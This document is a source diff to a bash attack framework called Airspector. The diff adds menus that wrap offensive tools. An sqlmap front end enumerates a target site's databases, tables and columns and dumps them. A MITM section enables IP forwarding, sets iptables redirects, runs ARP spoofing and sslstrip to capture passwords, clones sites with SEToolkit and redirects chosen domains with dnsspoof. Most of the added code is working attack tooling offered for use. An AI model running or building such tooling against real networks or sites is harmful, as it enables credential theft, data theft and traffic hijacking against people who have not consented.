@@ -150,6 +150,17 @@ alternative_rc_file_name="AIRSPECTORrc"
 language_strings_file="language_strings.sh"
 broadcast_mac="FF:FF:FF:FF:FF:FF"
 minimum_hcxdumptool_filterap_version="6.0.0"
+YNYES="("$YS"y"$CE"/"$YS"n"$CE")("$YS"Enter"$CE"=yes)"
+YNNO="("$YS"y"$CE"/"$YS"n"$CE")("$YS"Enter"$CE"=no)"
+YNONLY="("$YS"y"$CE"/"$YS"n"$CE")"
+PAKT="Press "$YS"any key$CE to"
+PAKTC="Press "$YS"any key$CE to continue..."
+PAKTGB="Press "$YS"any key$CE to go back..."
+TNI=""$RS"Tool is not installed. To install it type '"$CE""$YS"install"$CE""$RS"'."$CE""
+LPATH="/usr/share/airspector"
+export LPATH
+READAK="read -n 1"
+DEFMAC="00:11:22:33:44:55"
 
 
 
@@ -5861,6 +5872,10 @@ function main_menu() {
 	language_strings "${language}" 333 "blue"
 	language_strings "${language}" 426 "blue"
 	language_strings "${language}" 57  "blue"
+	language_strings "${language}" 60 "blue"
+	language_strings "${language}" 721 "blue"
+	print_large_separator "yellow"
+	language_strings "${language}" 722 "blue"
 	print_large_separator
 	
 	
@@ -5902,17 +5917,867 @@ function main_menu() {
 			enterprise_attacks_menu
 		;;
 		11)
-			credits_option
+			tools_menu 
 		;;
 		12)
-			option_menu
+			MITM_Attacks
+		;;
+		13)
+			Network-Manager-restart
 		;;
 		*)
 			invalid_menu_option
 		;;
+		
 	esac
 
 	main_menu
+}
+#network manager restart
+function Network-Manager-restart(){
+	sudo service networking restart
+	sudo service NetworkManager restart
+}
+#mitm tool menu
+function tools_menu(){
+	debug print
+	
+	clear
+	echo 
+	language_strings "${language}" 59 "green" #return main menu
+	language_strings "${language}" 715 "blue" #bettercap
+	language_strings "${language}" 718 "blue" #beef
+	language_strings "${language}" 719 "blue" # ReconDog
+	language_strings "${language}" 720 "blue" # sqlmap
+	
+	read -rp "$(echo -e "${blue_color}[${green_color}Airspector${blue_color}]-${blue_color}$")" tool_option
+	case ${tool_option} in
+		0)
+			return
+		;;
+		1)
+			Bettercap
+		;;
+		2)
+			Beef_tool
+		;;
+		3)
+			ReconDog
+		;;
+		4)
+			SQLmap_tool
+	esac
+	tools_menu
+	
+}
+#bettercap start
+function Bettercap() {
+	debug_print
+	xterm -hold -e 'bettercap' &
+}
+#ReconDog
+function ReconDog() {
+	debug_print
+	
+	clear
+	cd /home/kali/ReconDog
+	xterm -hold -e 'python dog' &
+}
+#beef
+function Beef_tool(){
+	debug_print
+	clear
+	cd /usr/share/beef-xss
+	sudo ./beef
+}
+#sqlmap
+function SQLmap_tool
+{
+file2="/root/lscript/sqltemp2"
+file3="/root/lscript/sqltemp3"
+file4="/root/lscript/sqltemp34"
+while true
+do
+	clear
+	TERMINALTITLE="SQLMAP"
+	dash_calc
+	printf '\033]2;SQLMAP\a'
+	if [[ "$URL" = "" ]]
+	then
+		URL=""$RS"None"$CE""
+		urls=0
+	fi
+	if [[ "$FDBS" = "" ]]
+	then
+		FDBS=""$RS"None"$CE""
+		fdbss=0
+	fi
+	if [[ "$SD" = "" ]]
+	then
+		SD=""$RS"None"$CE""
+		sds=0
+	fi
+	if [[ "$TB" = "" ]]
+	then
+		TB=""$RS"None"$CE""
+		tbs=0
+	fi
+	if [[ "$ST" = "" ]]
+	then
+		ST=""$RS"None"$CE""
+		sts=0
+	fi
+	if [[ "$CL" = "" ]]
+	then
+		CL=""$RS"None"$CE""
+		cls=0
+	fi
+	if [[ "$SC" = "" ]]
+	then
+		SC=""$RS"None"$CE""
+		scs=0
+	fi
+	echo -e ""$YS" 1"$CE") URL                         Current:"$YS"$URL"$CE""
+	if [[ "$urls" = 0 ]]
+	then
+		echo -e ""$RS" 2"$CE") Fetch databases             Current:$FDBS"
+	else
+		echo -e ""$YS" 2"$CE") Fetch databases             Current:$FDBS"
+	fi
+	if [[ "$fdbss" = 0 ]]
+	then
+		echo -e ""$RS" 3"$CE") Select database             Current:"$YS"$SD"$CE""
+	else
+		echo -e ""$YS" 3"$CE") Select database             Current:"$YS"$SD"$CE""
+	fi
+	if [[ "$sds" = 0 ]]
+	then
+		echo -e ""$RS" 4"$CE") Fetch tables                Current:"$YS"$TB"$CE""
+	else
+		echo -e ""$YS" 4"$CE") Fetch tables                Current:"$YS"$TB"$CE""
+	fi
+	if [[ "$tbs" = 0 ]]
+	then
+		echo -e ""$RS" 5"$CE") Select table                Current:"$YS"$ST"$CE""
+	else
+		echo -e ""$YS" 5"$CE") Select table                Current:"$YS"$ST"$CE""
+	fi
+	if [[ "$sts" = 0 ]]
+	then
+		echo -e ""$RS" 6"$CE") Fetch columns               Current:"$YS"$CL"$CE""
+	else
+		echo -e ""$YS" 6"$CE") Fetch columns               Current:"$YS"$CL"$CE""
+	fi
+	if [[ "$cls" = 0 ]]
+	then
+		echo -e ""$RS" 7"$CE") Select columns              Current:"$YS"$SC"$CE""
+	else
+		echo -e ""$YS" 7"$CE") Select columns              Current:"$YS"$SC"$CE""
+	fi
+	if [[ "$scs" = 0 ]]
+	then
+		echo -e ""$RS" s"$CE") Start"
+	else
+		echo -e ""$YS" s"$CE") Start"
+	fi
+	echo -e ""$YS" b"$CE") Go back"
+	echo -e "Choose: "
+	read SQ
+	clear
+	if [[ "$SQ" = 1 ]]
+	then
+		echo -n "URL: "
+		read URLL
+		if [[ "$URLL" != "" || "$URLL" = "b" ]]
+		then
+			URL="$URLL"
+			urls=1
+				##Clearing nexts
+				FDBS=""
+				fdbss=0
+				SD=""
+				sds=0
+				TB=""
+				tbs=0
+				ST=""
+				sts=0
+				cls=0
+				CL=""
+				scs=0
+				SC=""
+		fi
+	elif [[ "$SQ" = "s" ]]
+	then
+		if [[ "$scs" = 0 ]]
+		then
+			echo -e ""$RS"No columns selected"$CE""
+			sleep 2
+			break
+		fi
+		#~ export URL
+		#~ export SD
+		#~ export ST
+		#~ export SC
+		sqlmap -u "$URL" -D "$SD" -T "$ST" -C "$SC" --dump | tee "$file4"
+		echo -e ""
+		echo -e ""$YS"A log file has been created on "$file4". Copy it before it gets overwritten"$CE""
+		echo -e ""
+		echo -e "$PAKTGB"
+		$READAK
+	elif [[ "$SQ" = "b" ]]
+	then
+		break
+	elif [[ "$SQ" = 00 ]]
+	then
+		exec bash $0
+	elif [[ "$SQ" = 7 ]]
+	then
+		if [[ "$cls" = 0 ]]
+		then
+			echo -e ""$RS"Columns not fetched"$CE""
+			sleep 2
+			break
+		fi
+		n10=1
+		CCO1="$CO1"
+		while [[ "$n10" -le "$NCO" ]]
+		do
+			cl[$n10]=$(cat "$file3" | awk -v n12="$CCO1" '{if(NR==n12)print}' | cut -d ' ' -f2)
+			CCO1=$((CCO1+1))
+			n10=$((n10+1))
+		done
+		while true
+		do
+			clear
+			echo -e ""$BS"Columns: "$CE""
+			v=1
+			while [[ "$v" -le "$NCO" ]]
+			do
+				if [[ "${selc[$v]}" = 1 ]]
+				then
+					SSC="$YS"
+				else
+					SSC="$WS"
+				fi
+				if [[ "$v" -le 9 ]]
+				then
+					echo -e ""$YS"  $v"$CE") "$SSC"${cl[$v]}"$CE""
+				elif [[ "$v" -le 99 ]]
+				then
+					echo -e ""$YS" $v"$CE") "$SSC"${cl[$v]}"$CE""
+				else
+					echo -e ""$YS"$v"$CE") "$SSC"${cl[$v]}"$CE""
+				fi
+				v=$((v+1))
+			done
+			echo -e ""$YS" d"$CE") Deselect all"
+			echo -e ""$YS" s"$CE") Save selection"
+			echo -e ""$YS" b"$CE") Go back"
+			echo -e "Choose: "
+			read COCH
+			clear
+			if [[ "$COCH" = "b" || "$COCH" = "back" ]]
+			then
+				break
+			elif [[ "$COCH" = "s" ]] 
+			then
+				v2=1
+				SC=""
+				while [[ "$v2" -le "$NCO" ]]
+				do
+					if [[ "${selc[$v2]}" = 1 ]]
+					then
+						if [[ "$SC" = "" ]]
+						then
+							SC="${cl[$v2]}"
+						else
+							SC=""$SC","${cl[$v2]}""
+						fi
+					fi
+					v2=$((v2+1))
+				done
+				if [[ "$SC" = "" ]]
+				then
+					echo -e ""$RS"Nothing selected"$CE""
+					ssc=0
+					sleep 2
+				else
+					ssc=1
+				fi
+				break
+			elif [[ "$COCH" = "d" ]] 
+			then
+				v1=1
+				while [[ "$v1" -le "$NCO" ]]
+				do
+					selc[$v1]=""
+					v1=$((v1+1))
+				done
+			elif [[ "$COCH" -le 0 || "$COCH" -gt "$NCO" ]] 
+			then
+				echo -e ""$RS"Wrong choice"$CE""
+				sleep 2
+				continue
+			else
+				if [[ "${selc[$COCH]}" != 1 ]]
+				then
+					selc[$COCH]=1
+				else
+					selc[$COCH]=""
+				fi
+			fi
+		done
+	elif [[ "$SQ" = 6 ]]
+	then
+		while true
+		do
+			if [[ "$sts" = 0 ]]
+			then
+				echo -e ""$RS"Table not selected"$CE""
+				sleep 2
+				break
+			fi
+			sqlmap -u "$URL" -D "$SD" -T "$ST" --columns <<< $'\n\n\n\n\n\n\n\n\n\n' | tee $file3
+			##finding columns
+			CO=$(cat "$file3" | awk '{if(/+----/)print NR}')
+			CO1=$(echo $CO | cut -d ' ' -f2)
+			CO1=$((CO1+1))
+			CO2=$(echo $CO | cut -d ' ' -f3)
+			CO2=$((CO2-1))
+			NCO=$((CO2-CO1))
+			if [[ "$NCO" -le 0 ]]
+			then
+				echo -e ""$RS"Error 24. No columns found automatically"$CE""
+				sleep 2
+				cls=0
+				continue
+			else
+				if [[ "$NCO" = 1 ]]
+				then
+					echo -e ""$YS"1 column found!"$CE""
+					sleep 2
+				else
+					echo -e ""$YS""$NCO" columns found!"$CE""
+					sleep 2
+				fi
+				CL="Done"
+				cls=1
+				break
+			fi
+		done
+	elif [[ "$SQ" = 5 ]]
+	then
+		while true
+		do
+			if [[ "$tbs" = 0 ]]
+			then
+				echo -e ""$RS"Tables not fetched"$CE""
+				sleep 2
+				break
+			fi
+			echo -e ""$BS"Tables: "$CE""
+			n9=1
+			CC1="$C1"
+			while [[ "$n9" -le "$NTB" ]]
+			do
+				tb[$n9]=$(cat "$file2" | awk -v n11="$CC1" '{if(NR==n11)print}' | cut -d ' ' -f2)
+				if [[ "$n9" -le 9 ]]
+				then
+					echo -e ""$YS"  $n9"$CE") ${tb[$n9]}"
+				elif [[ "$n9" -le 99 ]]
+				then
+					echo -e ""$YS" $n9"$CE") ${tb[$n9]}"
+				else
+					echo -e ""$YS"$n9"$CE") ${tb[$n9]}"
+				fi
+				CC1=$((CC1+1))
+				n9=$((n9+1))
+			done
+			echo -e ""$YS" b"$CE") Go back"
+			echo -e "Choose: "
+			read TCH
+			if [[ "$TCH" = "b" || "$TCH" = "back" ]]
+			then
+				break
+			elif [[ "$TCH" -le 0 || "$TCH" -gt "$NTB" ]] 
+			then
+				echo -e ""$RS"Wrong choice"$CE""
+				sleep 2
+				continue
+			else
+				ST="${tb[$TCH]}"
+				sts=1
+				##Clearing nexts
+				cls=0
+				CL=""
+				scs=0
+				SC=""
+				break
+			fi
+		done
+	elif [[ "$SQ" = 4 ]]
+	then
+		if [[ "$sds" = 0 ]]
+		then
+			echo -e ""$RS"Databases not selected"$CE""
+			sleep 2
+			continue
+		fi
+		sqlmap -u "$URL" -D "$SD" --tables <<< $'\n\n\n\n\n\n\n\n\n\n' | tee "$file2"
+		##finding tables
+		C=$(cat "$file2" | awk '{if(/+----/)print NR}')
+		C1=$(echo $C | cut -d ' ' -f1)
+		C1=$((C1+1))
+		C2=$(echo $C | cut -d ' ' -f2)
+		C2=$((C2-1))
+		NTB=$((C2-C1))
+		if [[ "$NTB" -le 0 ]]
+		then
+			echo -e ""$RS"Error 23. No tables found automatically"$CE""
+			sleep 2
+			tbs=0
+			continue
+		else
+			if [[ "$NTB" = 1 ]]
+			then
+				echo -e ""$YS"1 table found!"$CE""
+				sleep 2
+			else
+				echo -e ""$YS""$NTB" tables found!"$CE""
+				sleep 2
+			fi
+			TB="Done"
+			tbs=1
+				##Clearing nexts
+				ST=""
+				sts=0
+				cls=0
+				CL=""
+				scs=0
+				SC=""
+		fi
+	elif [[ "$SQ" = 3 ]]
+	then
+		while true
+		do
+			if [[ "$fdbss" = 0 ]]
+			then
+				echo -e ""$RS"Databases not fetched"$CE""
+				sleep 2
+				continue
+			fi
+			echo -e ""$BS"Databases: "$CE""
+			n8=1
+			while [[ "$n8" -le "$NDB" ]]
+			do
+				if [[ "$n8" -le 9 ]]
+				then
+					echo -e ""$YS"  "$n8""$CE") ${db[$n8]}"
+				elif [[ "$n8" -le 99 ]]
+				then
+					echo -e ""$YS" "$n8""$CE") ${db[$n8]}"
+				else
+					echo -e ""$YS""$n8""$CE") ${db[$n8]}"
+				fi
+				n8=$((n8+1))
+			done
+			echo -e ""$YS" b"$CE") Go back"
+			echo -e "Choose: "
+			read DCH
+			clear
+			if [[ "$DCH" = "b" || "$DCH" = "back" ]]
+			then
+				break
+			fi
+			if [[ "$DCH" -lt 0 || "$DCH" -gt "$NDB" ]]
+			then
+				echo -e ""$RS"Wrong choice"$CE""
+				sleep 2
+			else
+				SD="${db[$DCH]}"
+				sds=1
+					##Clearing nexts
+					TB=""
+					tbs=0
+					ST=""
+					sts=0
+					cls=0
+					CL=""
+					scs=0
+					SC=""
+				break
+			fi	
+		done
+	elif [[ "$SQ" = 2 ]]
+	then
+		if [[ "$urls" != 1 ]]
+		then
+			echo -e ""$RS"URL not selected"$CE""
+			sleep 2
+			continue
+		fi
+		file="/root/lscript/sqltemp"
+		sqlmap -u "$URL" --dbs <<< $'\n\n\n\n\n\n\n\n\n\n' | tee "$file"
+		##Find the line
+		CHECK=$(cat "$file" | grep "available databases ")
+		if [[ "$CHECK" = "" ]]
+		then
+			fdbss=0
+			echo -e ""$RS"No databases found or not vulnerable website"$CE""
+			fdbss=0
+			echo -e "$PAKTGB"
+			$READAK
+			continue
+		fi
+		LINED=$(cat "$file" | awk '{if(/available databases /)print NR}')
+		LINED=$((LINED+1))
+		##list databases
+		n=0
+		echo -e ""BS"Calculating..."$CE""
+		while true
+		do
+			CH=$(cat "$file" | awk -v n7="$LINED" '{if(NR==n7)print}')
+			if [[ "$CH" = "" ]]
+			then
+				break
+			else
+				##how many dbs found
+				n=$((n+1))
+				##next line
+				LINED=$((LINED+1))
+			fi
+			CHH=$(echo "$CH" | awk -F "] " {'print $2'})
+			if [[ "$CHH" = "" ]]
+			then
+				echo -e ""$RS"Error 21"$CE""
+				CHH=""$RS"Error"$CE""
+				sleep 3
+			fi
+			db[$n]="$CHH"
+		done
+		sleep 1
+		if [[ "$n" = 0 ]]
+		then
+			echo -e ""$RS"Error 22 No databases found automatically"$CE""
+			echo -e "$PAKTGB"
+			$READAK
+			continue
+		elif [[ "$n" = 1 ]]
+		then
+			echo -e ""$YS"1 database found!"$CE""
+			sleep 1
+		else
+			echo -e ""$YS"$n databases found!"$CE""
+			sleep 1
+		fi
+		echo -e ""
+		FDBS=""$YS"Done"$CE""
+		fdbss=1
+		NDB="$n"
+				##Clearing nexts
+				SD=""
+				sds=0
+				TB=""
+				tbs=0
+				ST=""
+				sts=0
+				cls=0
+				CL=""
+				scs=0
+				SC=""
+	fi	
+done
+}
+function MITM_Attacks {
+	debug_print
+	
+clear
+echo -e "------------------------------"${red_color}$RS"MITM"$CE${blue_color}"-------------------------------"
+printf '\033]2;MITM\a'
+echo -e ""$YS" 1"$CE") Password sniff-sslstrip"
+echo -e ""$YS" 2"$CE") SET + mitm + dnsspoofing"
+echo -e ""$YS" 0"$CE") Go back"
+read -rp "$(echo -e "${blue_color}[${green_color}Airspector${blue_color}]-${blue_color}$")" MITMATT
+clear
+
+if [[ "$MITMATT" = "1" ]]
+then
+	while true
+	do
+	clear
+	echo -e "------------------------------"${red_color}$RS"MITM"$CE"-------------------------------"
+	echo -e "${blue_color}"$YS" 1"$CE") Enable ip_forward                 "$YS"d1"$CE") Disable ip_forward "
+	echo -e ""$YS" 2"$CE") Set iptables"
+	echo -e ""$YS" 3"$CE") Scan and select target IP         "$YS"33"$CE") I have scaned"
+	echo -e ""$YS" 4"$CE") Open the sslstrip log"            # "$YS"44"$CE") Filter credentials"
+	echo -e ""$YS" b"$CE") Go back"
+	
+	echo -e "Choose: "
+	read -e -rp "$(echo -e "${blue_color}[${green_color}Airspector${blue_color}]-${blue_color}$")" MITMCH
+	if [[ "$MITMCH" = "1" ]]
+	then
+		echo "1" > /proc/sys/net/ipv4/ip_forward
+		echo -e "Done."
+		sleep 1
+	elif [[ "$MITMCH" = "d1" ]]
+	then
+		echo "0" > /proc/sys/net/ipv4/ip_forward
+		echo -e "Done."
+		sleep 1
+	elif [[ "$MITMCH" = "2" ]]
+	then
+		clear
+		echo -e "Redirect tcp port 80 to port("$YS"Enter"$CE"=8080):"
+		read -rp "$(echo -e "${blue_color}[${green_color}Airspector${blue_color}]-${blue_color}$")" PORTTCP
+		if [[ "$PORTTCP" = "" ]]
+		then
+			PORTTCP="8080"
+		fi
+					clear
+		echo -e "Redirect udp port 40 to port("$YS"Enter"$CE"=40):"
+		read -rp "$(echo -e "${blue_color}[${green_color}Airspector${blue_color}]-${blue_color}$")" PORTUDP
+		if [[ "$PORTUDP" = "" ]]
+		then
+			PORTUDP="40"
+		fi
+		iptables --flush
+		iptables --flush -t nat
+		iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port $PORTTCP
+		iptables -t nat -A PREROUTING -p udp --destination-port 40 -j REDIRECT --to-port $PORTUDP
+		echo -e "Done."
+		sleep 1
+	elif [[ "$MITMCH" = "3" ]]
+	then
+		clear
+		route -n
+		echo -e ""
+		echo -e ""
+		echo -e "Enter your gateway(prefer "$ETH" gateway):"
+		read -rp "$(echo -e "${blue_color}[${green_color}Airspector${blue_color}]-${blue_color}$")" GATENM
+		echo -e ""
+		echo -e "Enter the gateway's interface("$YS"Enter"$CE"="$ETH"):"
+		read -rp "$(echo -e "${blue_color}[${green_color}Airspector${blue_color}]-${blue_color}$")" GATEINT
+		if [[ "$GATEINT" = "" ]]
+		then
+			GATEINT="$ETH"
+		fi	
+		while true
+		do	
+		clear
+		nmap -sP "$GATENM"/24
+		echo -e ""
+		echo -e ""
+		echo -e "Enter your target IP:"
+		read -rp "$(echo -e "${blue_color}[${green_color}Airspector${blue_color}]-${blue_color}$")" TARGIP
+		if [[ "$TARGIP" = "r" ]]
+		then
+			continue
+		else
+			break
+		fi
+		done
+		echo -e ""
+		echo -e "$PAKTC"
+		$READAK
+		export GATENM
+		export GATEINT
+		export TARGIP
+		export PORTTCP
+		export PORTUDP
+		cd "$LPATH"/ls
+		gnome-terminal --geometry 60x12+0+999999 -e ./l131.sh
+		gnome-terminal --geometry 60x20+999999+999999 -e ./l133.sh
+		gnome-terminal --geometry 60x20+999999+0 -e ./l132.sh
+		sslstrip -l $PORTTCP -w /root/sslstrip.log
+		echo -e "$PAKTGB"
+		$READAK
+		continue
+	elif [[ "$MITMCH" = "33" ]]
+	then
+		clear
+		echo -e "Enter your gateway(prefer "$ETH" gateway):"
+		read -rp "$(echo -e "${blue_color}[${green_color}Airspector${blue_color}]-${blue_color}$")" GATENM
+		echo -e ""
+		echo -e "Enter the gateway's interface("$YS"Enter"$CE"="$ETH"):"
+		read -rp "$(echo -e "${blue_color}[${green_color}Airspector${blue_color}]-${blue_color}$")" GATEINT
+		if [[ "$GATEINT" = "" ]]
+		then
+			GATEINT="$ETH"
+		fi
+		clear
+		echo -e "Enter your target IP("$YS"r"$CE"=rescan):"
+		read -rp "$(echo -e "${blue_color}[${green_color}Airspector${blue_color}]-${blue_color}$")" TARGIP
+		echo -e ""
+		echo -e "$PAKTC"
+		$READAK
+		export GATENM
+		export GATEINT
+		export TARGIP
+		export PORTTCP
+		export PORTUDP
+		cd "$LPATH"/ls
+		gnome-terminal --geometry 60x25+0+999999 -e ./l131.sh
+		gnome-terminal --geometry 60x25+999999+0 -e ./l132.sh
+		gnome-terminal --geometry 60x25+999999+999999 -e ./l133.sh
+		sslstrip -l $PORTTCP -w /root/sslstrip.log
+		echo -e "$PAKTGB"
+		$READAK
+		continue
+	elif [[ "$MITMCH" = "4" ]]
+	then
+		leafpad /root/sslstrip.log
+	#~ elif [[ "$MITMCH" = "44" ]]
+	#~ then
+	elif [[ "$MITMCH" = "back" || "$MITMCH" = "b" ]]
+	then
+		clear
+		break
+	elif [[ "$MITMCH" = "00" ]]
+	then
+		clear
+		exec bash "$0"
+	elif [[ "$MITMCH" = "0" ]]
+	then
+		return
+	fi
+	done
+elif [[ "$MITMATT" = "2" ]]
+then
+	while true
+	do
+	clear
+	echo -e "------------------------------"${red_color}$RS"MITM"$CE"-------------------------------"
+	echo -e "${blue_color}"$YS" 1"$CE") Enable ip_forward                 "$YS"d1"$CE") Disable ip_forward"
+	echo -e ""$YS" 2"$CE") Scan and select target IP         "$YS"22"$CE") I have scaned"
+	echo -e ""$YS" 3"$CE") Start ARPspoofing"
+	#~ echo -e ""$YS" 4"$CE") Start apache2 service             "$YS"d4"$CE") Stop apache2 service"
+	echo -e ""$YS" 4"$CE") Start SEToolkit"
+	echo -e ""$YS" 5"$CE") Start DNSspoofing"
+	echo -e ""$YS" b"$CE") Go back"
+	
+	echo -e "Choose: "
+	read -rp "$(echo -e "${blue_color}[${green_color}Airspector${blue_color}]-${blue_color}$")" MITMSET
+	clear
+	if [[ "$MITMSET" = "1" ]]
+	then
+		echo "1" > /proc/sys/net/ipv4/ip_forward
+		echo -e "Done."
+		sleep 1
+	elif [[ "$MITMSET" = "d1" ]]
+	then
+		echo "0" > /proc/sys/net/ipv4/ip_forward
+		echo -e "Done."
+		sleep 1
+	elif [[ "$MITMSET" = "2" ]]
+	then
+		route -n
+		echo -e ""
+		echo -e ""
+		echo -e "Enter your gateway:"
+		read -rp "$(echo -e "${blue_color}[${green_color}Airspector${blue_color}]-${blue_color}$")" GATENM
+		echo -e ""
+		echo -e "Enter the gateway's interface(e.g: wlan0):"
+		read -rp "$(echo -e "${blue_color}[${green_color}Airspector${blue_color}]-${blue_color}$")" GATEINT
+		while true
+		do		
+		clear
+		nmap -sP "$GATENM"/24
+		echo -e ""
+		echo -e ""
+		echo -e "Enter your target IP("$YS"r"$CE"=rescan):"
+		read -rp "$(echo -e "${blue_color}[${green_color}Airspector${blue_color}]-${blue_color}$")" TARGIP
+		if [[ "$TARGIP" = "r" ]]
+		then
+			continue
+		else
+			break
+		fi
+		done
+	elif [[ "$MITMSET" = "22" ]]
+	then
+		echo -e "Enter your gateway:"
+		read -rp "$(echo -e "${blue_color}[${green_color}Airspector${blue_color}]-${blue_color}$")" GATENM
+		echo -e ""
+		echo -e "Enter the gateway's interface(e.g: wlan0):"
+		read -rp "$(echo -e "${blue_color}[${green_color}Airspector${blue_color}]-${blue_color}$")" GATEINT
+		clear
+		echo -e "Enter your target IP:"
+		read -rp "$(echo -e "${blue_color}[${green_color}Airspector${blue_color}]-${blue_color}$")" TARGIP
+	elif [[ "$MITMSET" = "3" ]]
+	then
+		export PAKTC
+		export GATEINT
+		export TARGIP
+		export GATENM
+		cd "$LPATH"/ls
+		gnome-terminal --geometry 60x15+999999+0 -e ./l132.sh
+		gnome-terminal --geometry 60x15+999999+999999 -e ./l133.sh
+	#~ elif [[ "$MITMSET" = "4" ]]
+	#~ then
+		#~ service apache2 start
+	#~ elif [[ "$MITMSET" = "d4" ]]
+	#~ then
+		#~ service apache2 stop
+	elif [[ "$MITMSET" = "4" ]]
+	then
+		echo -e "Clone a website to one of the following IP(s):"
+		ip addr | grep '/24' | awk -F "inet " {'print $2'} | cut -d '/' -f1
+		echo -e "$PAKTC"
+		$READAK
+		gnome-terminal --geometry 60x15+999999+999999 -e setoolkit
+	elif [[ "$MITMSET" = "5" ]]
+	then
+		echo -e "Making you a hosts.txt file"
+		echo -e ""
+		echo -e "Enter your IP address that you started the server:"
+		echo -e "One of this/these:"
+		ip addr | grep '/24' | awk -F "inet " {'print $2'} | cut -d '/' -f1
+		read -rp "$(echo -e "${blue_color}[${green_color}Airspector${blue_color}]-${blue_color}$")" SERVIP
+		echo -e "Enter the interface of that IP(e.g: wlan0):"
+		read -rp "$(echo -e "${blue_color}[${green_color}Airspector${blue_color}]-${blue_color}$")" INTIP
+		if [[ -f ""$LPATH"/HOSTS/hosts.txt" ]]
+		then
+			rm "$LPATH"/HOSTS/hosts.txt
+		fi
+		mkdir "$LPATH"/HOSTS
+		clear
+		while true
+		do
+		clear
+		echo -e "Enter the URL you want to redirect your IP from(e.g: thisis.myfakesite.com):"
+		read -rp "$(echo -e "${blue_color}[${green_color}Airspector${blue_color}]-${blue_color}$")" URL
+		echo "$SERVIP	$URL" >> "$LPATH"/HOSTS/hosts.txt
+		sleep 0.2
+		clear
+		echo -e "Add another one as well?"$YNYES""
+		read -rp "$(echo -e "${blue_color}[${green_color}Airspector${blue_color}]-${blue_color}$")" ANOTHERHOST
+		if [[ "$ANOTHERHOST" = "n" ]]
+		then
+			break
+		fi
+		done
+		clear
+		echo -e "Starting dnsspoof..."
+		echo -e "$PAKTC"
+		$READAK
+		export INTIP
+		xterm -geometry 60x15+0+999999 -e 'dnsspoof -i $INTIP -f "$LPATH"/HOSTS/hosts.txt'				
+	elif [[ "$MITMSET" = "back" || "$MITMSET" = "b" ]]
+	then
+		clear
+		break
+	
+	fi
+	done
+elif [[ "$MITMATT" = "back" || "$MITMATT" = "b" ]]
+then
+	BACKL="1"
+	break
+
+elif [[ "$MITMATT" = "0" ]]
+then
+	return
+fi
 }
 
 #Enterprise attacks menu
@@ -14982,30 +15847,6 @@ function check_compatibility() {
 	fi
 }
 
-#Check for the minimum bash version requirement
-
-
-#Check if you have installed the tools required to update the script
-function check_update_tools() {
-
-	debug_print
-
-	if "${AIRSPECTOR_AUTO_UPDATE:-true}"; then
-		if [ "${update_toolsok}" -eq 1 ]; then
-			autoupdate_check
-		else
-			echo
-			language_strings "${language}" 225 "yellow"
-			language_strings "${language}" 115 "read"
-		fi
-	else
-		if [ "${is_docker}" -eq 1 ]; then
-			echo
-			language_strings "${language}" 422 "blue"
-			language_strings "${language}" 115 "read"
-		fi
-	fi
-}
 
 #Check if window size is enough for intro
 function check_window_size_for_intro() {
@@ -15035,28 +15876,26 @@ function print_intro() {
 
 	debug_print
 
-	echo -e "${blue_color}                  
-	
-
-						░█████╗░██╗██████╗░░██████╗██████╗░███████╗░█████╗░████████╗░█████╗░██████╗░
-						██╔══██╗██║██╔══██╗██╔════╝██╔══██╗██╔════╝██╔══██╗╚══██╔══╝██╔══██╗██╔══██╗
-						███████║██║██████╔╝╚█████╗░██████╔╝█████╗░░██║░░╚═╝░░░██║░░░██║░░██║██████╔╝
-						██╔══██║██║██╔══██╗░╚═══██╗██╔═══╝░██╔══╝░░██║░░██╗░░░██║░░░██║░░██║██╔══██╗
-						██║░░██║██║██║░░██║██████╔╝██║░░░░░███████╗╚█████╔╝░░░██║░░░╚█████╔╝██║░░██║
-						╚═╝░░╚═╝╚═╝╚═╝░░╚═╝╚═════╝░╚═╝░░░░░╚══════╝░╚════╝░░░░╚═╝░░░░╚════╝░╚═╝░░╚═╝${normal_color}"
+	echo -e "${green_color}  
+░█████╗░██╗██████╗░░██████╗██████╗░███████╗░█████╗░████████╗░█████╗░██████╗░
+██╔══██╗██║██╔══██╗██╔════╝██╔══██╗██╔════╝██╔══██╗╚══██╔══╝██╔══██╗██╔══██╗
+███████║██║██████╔╝╚█████╗░██████╔╝█████╗░░██║░░╚═╝░░░██║░░░██║░░██║██████╔╝
+██╔══██║██║██╔══██╗░╚═══██╗██╔═══╝░██╔══╝░░██║░░██╗░░░██║░░░██║░░██║██╔══██╗
+██║░░██║██║██║░░██║██████╔╝██║░░░░░███████╗╚█████╔╝░░░██║░░░╚█████╔╝██║░░██║
+╚═╝░░╚═╝╚═╝╚═╝░░╚═╝╚═════╝░╚═╝░░░░░╚══════╝░╚════╝░░░░╚═╝░░░░╚════╝░╚═╝░░╚═╝ ${normal_color}"
 	echo
 	language_strings "${language}" 228 "blue"
 	
-	flying_saucer
+	Ascii_art
 	sleep 2
 }
 
-#Generate the frames of the animated ascii art flying saucer
-function flying_saucer() {
+#Generate the frames of the animated ascii art 
+function Ascii_art() {
 
 	debug_print
 	echo -e "⠀
-		${yellow_color}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⠀⠀⠀⠀⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+		${yellow_color}⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⢀⣀⠀⠀⠀⠀⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 	⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⣿⣷⡀⠀⠀⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 	⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣿⣿⣿⣄⠀⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 	⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢻⣿⣿⣆⢸⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
@@ -15557,7 +16396,7 @@ function initialize_colors() {
 	normal_color="\e[1;0m"
 	green_color="\033[1;32m"
